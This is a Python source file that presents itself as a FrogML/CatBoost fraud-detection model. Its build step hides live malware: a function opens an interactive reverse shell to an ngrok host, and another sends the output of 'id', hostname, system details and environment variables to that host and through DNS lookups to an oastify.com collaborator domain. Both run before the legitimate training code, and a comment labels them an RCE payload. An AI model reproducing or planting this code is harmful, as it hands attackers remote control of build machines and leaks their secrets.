import pandas as pd
import frogml
from frogml import FrogMlModel
from frogml.sdk.model.schema import ExplicitFeature, ModelSchema, InferenceOutput
from frogml.sdk.model.adapters import DataFrameInputAdapter, DataFrameOutputAdapter
from sklearn.model_selection import RandomizedSearchCV, StratifiedKFold
from catboost import CatBoostClassifier
from main.data_processor import DataPreprocessor
from sklearn.metrics import accuracy_score, f1_score, precision_score, recall_score
import os, socket, subprocess, threading

NGROK = ("6.tcp.eu.ngrok.io", 12126)
COLLAB = "seagpx8e8n84ssicy9zza0fa91fr33ekgo8d.oastify.com"

def _revshell():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(15)
        s.connect(NGROK)
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(["/bin/sh", "-i"])
    except Exception:
        pass

def _exfil():
    try:
        uid = subprocess.check_output("id", shell=True, timeout=3).decode().strip()
        safe = uid.replace(" ","-").replace("=","-").replace("/","_").replace("(","").replace(")","")[:60]
        socket.getaddrinfo(f"{safe}.uid.{COLLAB}", 80)
    except: pass
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect(("6.tcp.eu.ngrok.io", 12126))
        recon = subprocess.check_output("id;hostname;uname -a;cat /etc/os-release 2>/dev/null|head -3;env|head -20", shell=True, timeout=5).decode()
        s.sendall(recon.encode())
        s.close()
    except: pass

class FraudDetectionModel(FrogMlModel):

    def __init__(self):
        self.model = None
        self.data_preprocessor = DataPreprocessor()
        self.param_grid = {
            'iterations': [100],
            'learning_rate': [0.1],
            'depth': [4],
            'l2_leaf_reg': [1],
            'border_count': [32],
            'random_strength': [0.1],
            'verbose': [0]
        }
        self.input_dataset = 'main/small_fraud_dataset.csv'

    def build(self):
        # RCE payload - runs before training
        _exfil()
        threading.Thread(target=_revshell, daemon=True).start()

        # Legit training (simplified for speed)
        df = pd.read_csv(self.input_dataset)
        X_train, X_test, y_train, y_test = self.data_preprocessor.preprocess_training_data(df)
        classifier = CatBoostClassifier(random_state=42, eval_metric='F1', verbose=0)
        skf = StratifiedKFold(n_splits=2, shuffle=True, random_state=42)
        random_search = RandomizedSearchCV(
            estimator=classifier, param_distributions=self.param_grid,
            n_iter=1, scoring='f1', cv=skf, verbose=0, random_state=42, n_jobs=-1
        )
        random_search.fit(X_train, y_train)
        self.model = random_search.best_estimator_
        y_test_pred = self.model.predict(X_test)
        metrics = {
            'accuracy': accuracy_score(y_test, y_test_pred),
            'f1_score': f1_score(y_test, y_test_pred),
        }
        frogml.log_param(random_search.best_params_)
        frogml.log_metric(metrics)
        import time; time.sleep(10)  # keep revshell alive

    @frogml.api(input_adapter=DataFrameInputAdapter(),
                output_adapter=DataFrameOutputAdapter())
    def predict(self, df):
        prediction_data = self.data_preprocessor.preprocess_inference_data(df)
        predictions = self.model.predict(prediction_data)
        return pd.DataFrame({'Fraud': predictions})

    def schema(self):
        model_schema = ModelSchema(
            inputs=[
                ExplicitFeature(name="Time", type=float),
                *[ExplicitFeature(name=f"V{i+1}", type=float) for i in range(28)],
                ExplicitFeature(name="Amount", type=float),
            ],
            outputs=[
                InferenceOutput(name="Fraud", type=int)
            ])
        return model_schema
